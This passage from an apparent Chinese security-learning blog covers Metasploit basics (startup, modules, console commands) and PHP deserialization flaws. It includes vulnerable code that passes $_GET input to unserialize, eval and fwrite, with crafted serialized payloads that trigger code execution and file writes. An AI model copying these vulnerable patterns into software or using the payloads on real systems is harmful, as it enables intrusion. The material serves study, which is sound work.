title="二、为什么要有MSF"></a>二、为什么要有MSF</h1><p>渗透测试者的困扰：在众多漏洞的工具中，不知道如何选择。认为需要掌握数百个工具软件，上千个命令参数，实在记不住。而且有的工具只能利用一些老的漏洞，对新出现的漏洞是没有用的，你很有可能要针对这个新的漏洞再学一款新的工具，这样就要花费很多时间去学习新工具的使用，及其浪费时间，而且新出现的漏洞POC&#x2F;EXP 有不同的运行环境要求，准备工作繁琐。如果能统一就好了，于是 Metasploit 就产生了。<br>#三、MSF如何使用<br>##1、启动MSF<br>启动命令：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(root@kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole</span></span><br></pre></td></tr></table></figure><p>当加载完成后默认会出现以下画面，banner字符图是随机的，每次都不一样。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/0323b93410134a6e971e1ac2d0ae6f14.png" alt="在这里插入图片描述"><br>命令补充：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看msf版本信息</span></span><br><span class="line">┌──(root@kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole -v      </span></span><br><span class="line">Framework Version: <span class="number">6.0</span>.<span class="number">22</span><span class="literal">-dev</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -q是指quite , 静默输出 , 不会打印banner信息</span></span><br><span class="line">┌──(root@kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole</span></span><br></pre></td></tr></table></figure><p>启动补充：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">msf5版本以前启动 Metasploit 框架需要运行 Postgresql 数据库，msf5以后只要运行 Metasploit 时都会自动启</span><br><span class="line"></span><br><span class="line">动 Postgresql 数据库。如果数据库没启动的话，可以手动开启，下面时管理数据库的一些命令。</span><br><span class="line"></span><br><span class="line"> root@kali:~<span class="comment"># netstat -pantu | grep 5432          查看数据库是否被启动                 </span></span><br><span class="line"></span><br><span class="line"> root@kali:~<span class="comment"># systemctl start postgresql              手动启动数据库                          </span></span><br><span class="line"> root@kali:~<span class="comment"># systemctl enable postgresql           设置成开机启动数据库 </span></span><br><span class="line"></span><br><span class="line"> msfdb init                                                            <span class="comment">#启动并初始化数据库</span></span><br><span class="line"> msfdb reinit                                                         <span class="comment">#删除并重新初始化数据库</span></span><br><span class="line"> msfdb delete                                                       <span class="comment">#删除数据库并停止使用它 </span></span><br><span class="line"> msfdb <span class="built_in">start</span>                                                          <span class="comment">#启动数据库 </span></span><br><span class="line"> msfdb stop                                                          <span class="comment">#停止数据库 </span></span><br><span class="line"> msfdb status                                                       <span class="comment">#检查服务状态 </span></span><br><span class="line"> msfdb run                                                           <span class="comment">#启动数据库并运行msfconsole </span></span><br><span class="line"> </span><br><span class="line">Msfconsole 接口启动命令：最流行的用户接口，几乎可以使用全部 MSF 功能，控制台命令支持 TAB 自动补全，支持外部命令的执行(系统命令等)</span><br></pre></td></tr></table></figure><h2 id="2、更新MSF"><a href="#2、更新MSF" class="headerlink" title="2、更新MSF"></a>2、更新MSF</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更换kali自带的源，改为国内的源，这样下载比较快</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 编辑源文件</span></span><br><span class="line">vim  /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加中科大源</span></span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali<span class="literal">-rolling</span> main non<span class="literal">-free</span> contrib</span><br><span class="line">deb<span class="literal">-src</span> http://mirrors.ustc.edu.cn/kali kali<span class="literal">-rolling</span> main non<span class="literal">-free</span> contrib</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/42919ce6b8144adf8347b644bf2df5d4.png" alt="在这里插入图片描述"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新软件包</span></span><br><span class="line">apt<span class="literal">-get</span> update         <span class="comment"># 更新一下软件包的数据库，不进行软件的更新</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新msf框架</span></span><br><span class="line">apt<span class="literal">-get</span>  install metasploit<span class="literal">-framework</span></span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;如果在更新后出现以下问题：&#x3D;&#x3D;</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfconsole </span></span><br><span class="line"></span><br><span class="line">Could not find reline<span class="literal">-0</span>.<span class="number">1.5</span> <span class="keyword">in</span> any of the sources</span><br><span class="line"></span><br><span class="line">Run   bundle install  to install missing gems.</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;则使用以下方法解决：&#x3D;&#x3D;</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kaliew:~<span class="comment"># sudo gem install bundler</span></span><br><span class="line"></span><br><span class="line">root@kaliew:~<span class="comment"># bundle update celluloid</span></span><br></pre></td></tr></table></figure><h2 id="3、退出MSF"><a href="#3、退出MSF" class="headerlink" title="3、退出MSF"></a>3、退出MSF</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 退出msf框架</span></span><br><span class="line">msf6 &gt; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><h1 id="四、MSF的目录结构"><a href="#四、MSF的目录结构" class="headerlink" title="四、MSF的目录结构"></a>四、MSF的目录结构</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e90049539fb946baa01833a666fd48dc.png" alt="在这里插入图片描述"><br>MSF在kali上存放目录：&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;<br><img src="http://120.48.107.243:9090/blog/2023/04/03/84a8aede5e4a4707a3df0255cd966cf3.png" alt="在这里插入图片描述"><br>##1、Modules目录<br>这个目录下就是我们常用的技术功能模块：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root@kali)-[/<span class="type">usr</span>/<span class="type">share</span>/<span class="type">metasploit</span>-<span class="type">framework</span>]</span><br><span class="line">└─<span class="comment"># cd modules                         </span></span><br><span class="line">                                                                                                                                                             </span><br><span class="line">┌──(root@kali)-[/<span class="type">usr</span>/<span class="type">share</span>/<span class="type">metasploit</span>-<span class="type">framework</span>/<span class="type">modules</span>]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br></pre></td></tr></table></figure><p>技术功能模块分类：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、Auxiliary  负责执行信息收集、扫描、嗅探、指纹识别、口令猜测和 Dos 攻击等功能的辅助模块</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、Exploits   主要包含了传说中的exp , 各种漏洞利用的脚本。主要的攻击代码全在这里</span><br><span class="line"></span><br><span class="line">                   利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、Payloads  这个单词翻译过来叫载荷：是攻击者发送给目标系统执行的指令（不包含exploits攻击阶段），</span><br><span class="line"></span><br><span class="line">payloads主要是在目标主机执行的，而exploits是在本地机执行作用于目标机。</span><br><span class="line"></span><br><span class="line">payload 分为 <span class="number">3</span> 种类型 ，分别是 singles、stages 和 stagers。shellcode 是特殊的 payload，用于拿shell</span><br><span class="line"></span><br><span class="line">●  singles：all<span class="operator">-in</span><span class="literal">-one</span>。完整的 payload，这些 payload 都是一体化的，不需要依赖外部的库和包。 </span><br><span class="line">●  stagers：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接 </span><br><span class="line">●  stages：利用 stagers 建立的连接下载后续 payload </span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、Encoders  各种编码工具 , 对 payload 进行加密 , 用于躲过入侵检测和过滤系统</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、Nops    NOP (No Operation or Next Operation) sled,由于IDS/IPS会检查数据包中不规则的数据，所以在</span><br><span class="line"></span><br><span class="line">某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x90...)则会因为被拦截而导致攻击失效，所以此</span><br><span class="line"></span><br><span class="line">时需要修改exploit中的NOPs.nops文件夹下的东西会在payload生成时用到(后面会有介绍)。比如我们打开php的</span><br><span class="line"></span><br><span class="line">NOPS生成脚本，就会发现它只是返回了指定长度的空格而已。（不理解没关系）</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、Post  这个目录里放着msf 的exploits执行成功后，向目标机发送的一些功能性指令比如：提权，获取hash等</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>、Evasion msf中的混淆模块 , 更新了后  自带windows denfender的混淆 , 效果一般 早不免杀了 , 总比没有好  自己配合其他手段免杀</span><br></pre></td></tr></table></figure><h2 id="2、data目录"><a href="#2、data目录" class="headerlink" title="2、data目录"></a>2、data目录</h2><p>cd data<br><img src="http://120.48.107.243:9090/blog/2023/04/03/bdf8a0ec04a74c188f6307dc9ecb8872.png" alt="在这里插入图片描述"><br>存放 meterpreter、passivex、vnc、dlls等工具和一些用户接口代码，msfweb和一些其他模块用到的数据文件</p><h2 id="3、Plugins目录"><a href="#3、Plugins目录" class="headerlink" title="3、Plugins目录"></a>3、Plugins目录</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/26141b0cf3cd49599b13e598df6cd400.png" alt="在这里插入图片描述"><br>这个模块需要使用 load 加载,提供数据库连接插件，和各种要用到的插件。即插件目录</p><h2 id="4、Scripts目录"><a href="#4、Scripts目录" class="headerlink" title="4、Scripts目录"></a>4、Scripts目录</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/03/405fd81ca710439a8fabbe3d3d04de0c.png" alt="在这里插入图片描述"><br>这个目录下的文件都是meterpreter利用的脚本</p><h1 id="五、MSF基础命令"><a href="#五、MSF基础命令" class="headerlink" title="五、MSF基础命令"></a>五、MSF基础命令</h1><h2 id="1、help"><a href="#1、help" class="headerlink" title="1、help"></a>1、help</h2><p>当你刚进入msf终端时，可以使用help查看msf的命令有哪些，以及解释。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help</span><br><span class="line">msf6 &gt; ?</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1215ab8473f54c6a83b164ae12ef3717.png" alt="在这里插入图片描述"><br>显示某一命令的用法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; help banner</span><br><span class="line">msf6 &gt; ? banner       <span class="comment"># ? 和命令中间是有空格的</span></span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/dec123bec1cd41d2bde5b3de3bd3cf98.png" alt="在这里插入图片描述"><br>##2、banner<br>查看当前msf的版本信息和模块数量<br><img src="http://120.48.107.243:9090/blog/2023/04/03/6c17c811d4ce455eaebac2c5df55c9b9.png" alt="在这里插入图片描述"></p><h2 id="3、search"><a href="#3、search" class="headerlink" title="3、search"></a>3、search</h2><p>搜索模块<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8284008b99a94b4e94011f5622c9fcc6.png" alt="在这里插入图片描述"></p><h2 id="4、use"><a href="#4、use" class="headerlink" title="4、use"></a>4、use</h2><p>search找到模块后，用use使用模块<br><img src="http://120.48.107.243:9090/blog/2023/04/03/41ccf6f666ac44a186fc39a9dd32fba3.png" alt="在这里插入图片描述"><br>##5、其他常用命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">background                    <span class="comment"># 会话放到后台</span></span><br><span class="line">sessions                          <span class="comment">#sessions –h 查看帮助</span></span><br><span class="line">sessions <span class="literal">-i</span> &lt;ID值&gt;         <span class="comment">#进入会话   -k  杀死会话</span></span><br><span class="line">back                               <span class="comment">#返回上一步</span></span><br><span class="line">run/exploit                     <span class="comment">#执行已有的模块，输入run后按两下tab，列出已有的脚本   -j , 后台运行</span></span><br><span class="line">info                                 <span class="comment">#查看已有模块信息</span></span><br><span class="line">load                                <span class="comment">#加载插件</span></span><br><span class="line">jobs                                <span class="comment">#显示和管理作业 </span></span><br><span class="line"><span class="built_in">kill</span>                                  <span class="comment"># 杀死一个job  , kill 0</span></span><br><span class="line">nmap                             <span class="comment"># msf控制台内置的有nmap工具</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 工具学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 工具学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化的学习</title>
      <link href="/2022/04/21/deserialize/"/>
      <url>/2022/04/21/deserialize/</url>
      
        <content type="html"><![CDATA[<p>&#x3D;&#x3D;本篇文章只是用来笔记记录，交流学习，不得用于其他用途。&#x3D;&#x3D;</p><h1 id="一、描述"><a href="#一、描述" class="headerlink" title="一、描述"></a>一、描述</h1><p>反序列化又叫对象注入，序列化在内部没有漏洞，漏洞产生是因为程序在处理对象、魔术函数以及序列化相关问题导致的，当传给unserialize（）参数可控时，那么用户就可以注入payload，进行反序列化的时候就看你触发对象中的一些魔术方法。<br>#二、序列化和反序列化介绍<br>serialize（）将一个对象转换成一个字符串。<br>unserialize（）将字符串还原为一个对象。<br>在php应用中，序列化和反序列化一般用作缓存，比如session缓存，cookie等，简单点讲序列化就是把一个对象变为可以传输的字符串，而序列化就是把字符还原为对象。<br>#三、序列化<br>##1、序列化方法<br>php中序列化一般有以下几种，使用serialize（）方法。<br>##2、序列化serialize（）<br>对象的状态信息转换为可以存储或传输的形式的过程，在序列化期间，对象将当前的状态写入到临时或持久性的存储区，将状态信息保存为字符串。<br>##3、字符串序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;序列化：&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为序列化：s：4：“test”；<br>序列化格式介绍：s表示字符串（string），4表示长度，test是值。<br><img src="http://120.48.107.243:9090/blog/2023/04/01/43ed936ccbab4a4181f3c8a750b2ba64.png" alt="在这里插入图片描述"></p><h2 id="4、数组对象序列化"><a href="#4、数组对象序列化" class="headerlink" title="4、数组对象序列化"></a>4、数组对象序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>(<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;jack&#x27;</span>,<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">13</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果为：a：2：{s：4：“name”；s：4：“jacl”；s：3：“age”；i：13；}<br>##5、对象序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="variable">$a</span> =<span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class</span> =<span class="keyword">new</span> test;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$class</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：0:4：“test”：1：{s：1：“a”；s：4：“test”；}<br>序列化格式介绍：o表示类，4表示类名长度，test是类名，1代表类中有一个属性，s字符串，1长度1为，a是属性名，test是属性的值。<br>##6、扩展<br>序列化也会把变量的属性存储到字符串里：<br><img src="http://120.48.107.243:9090/blog/2023/04/01/2bcb3ac815814a6d873ade9cccb977ff.png" alt="在这里插入图片描述"><br>##7、序列化字符含义<br>a – array 数组<br>b – boolean 布尔型<br>d – double 双精度型<br>i – integer 整型<br>o – common object ⼀般对象<br>r – reference 引⽤<br>s – string 字符串<br>C – custom object ⾃定义对象<br>O – class N – null 表示类<br>R – pointer reference 引⽤传递<br>U – unicode string unicode编码的字符串<br>#四、反序列化<br>##1、简介<br>反序列化：显而易见，那么就是序列化过程的逆向操作而已，也就是将字符串转换为对象。<br>而反序列化漏洞就是因为在反序列化转换的过程中，触发代码执行，从而造成漏洞，关键点还是在于可控或不可控。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化后，如果$test可控，类在实例化的时候，值会传入$this→test，因为是echo内容是直接输出会造成xss漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;&lt;script&gt;alert(1);&lt;/script&gt;&quot;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化后的结果：O:1:”S”:1:{s:4:”test”;s:26:”<script>alert(1);</script>“;}<br>##2、反序列化漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">S</span>();</span><br><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>正常后面不跟请求参数是正常返回的，但是如果$_GET[‘url’] 为可控的，那么，输入序列化后的payload同样会被执行。<br>##3、反序列化里的魔法函数<br>__construct() 当⼀个对象创建时被调⽤（ 构造函数，当对象创建(new)时会⾃动调⽤。 unserialize()反序列化时是不会⾃动调⽤的。 ）；<br>__destruct() 当⼀个对象销毁前被调⽤ ；<br>__sleep() 在对象被序列化前被调⽤ （ ⽤于提交未提交的数据，或类似的清理操作 ）；<br>__wakeup() 将在反序列化之后⽴即被调⽤（当使⽤unserialize()进⾏反序列话时，就会被调⽤， unserialize()时会检查是否存在 wakeup()，如果存在，则会优先调⽤wakeup()⽅法 ）；<br>__toString() 当⼀个对象被当做字符串使⽤时被调⽤ ；<br>__get(),__set() 当调⽤或设置⼀个类及其⽗类⽅法中未定义的属性时 ；<br>__invoke() 调⽤函数的⽅式调⽤⼀个对象时的回应⽅法 ；<br>__call() 和 __callStatic() 前者是调⽤类不存在的⽅法时执⾏，⽽后者是调⽤类不存在的静态⽅式⽅法时执⾏。<br>##4、反序列化漏洞（_wakeup）魔法函数漏洞演示<br>_ <em>wakeup（）将在反序列化之后立即被调用（当使用unserialize（）进行反序列化时，就会被调用，unserialize（）时会检查是否存在</em> <em>wakeup（），如果存在，则会优先调用</em> <em>wakeup（）方法）；<br>在反序列化过程中，当</em> <em>wakeup（）的个数大于实际个数时会被绕过，从而不再执行</em> _wakeup（）内的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过以上代码，尝试构造payload，执行phpinfo()；<br>O:1:”A”:1:{s:4:”test”;s:10:”phpinfo();”;}<br>解释：传入的参数被反序列化，导致魔术方法_ <em>wakeup()被自动调用，这时参数传入的值被视为eval（）的参数使用，所以这里会因反序列化导致任意代码执行。<br>##5、反序列化漏洞(</em> _wakeup()和文件操作)<br>__wakeup() 将在反序列化之后⽴即被调⽤（当使⽤ unserialize() 进⾏反序列话时，就会被调⽤， unserialize() 时会检查是否存在 __wakeup() ，如果存在，则会优先调⽤__wakeup() ⽅法 ）；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"> <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$this</span>-&gt;test);</span><br><span class="line"> <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="variable">$class1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$class1_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$class1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过以上代码，构造payload执行phpinfo()；<br>O:1:”A”:1:{s:4:”test”;s:18:”<?php phpinfo();?>“;}<br>继续访问123.php文件，同样可以执行phpinfo。<br>解释：和上⾯⼀样，当传⼊的参数被反序列化时，魔术⽅法 _<em>wakeup() 被调⽤，传⼊的参数会作为 fwrite() 的第⼆个参数直接写⼊123.php⽂件中，从⽽导致反序列化漏洞。<br>##6、反序列化漏洞（</em> _construct）<br>__construct() 当⼀个对象创建时被调⽤（ 构造函数，当对象创建(new)时会⾃动调⽤。 unserialize() 反序列化时是不会⾃动调⽤的。 ）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 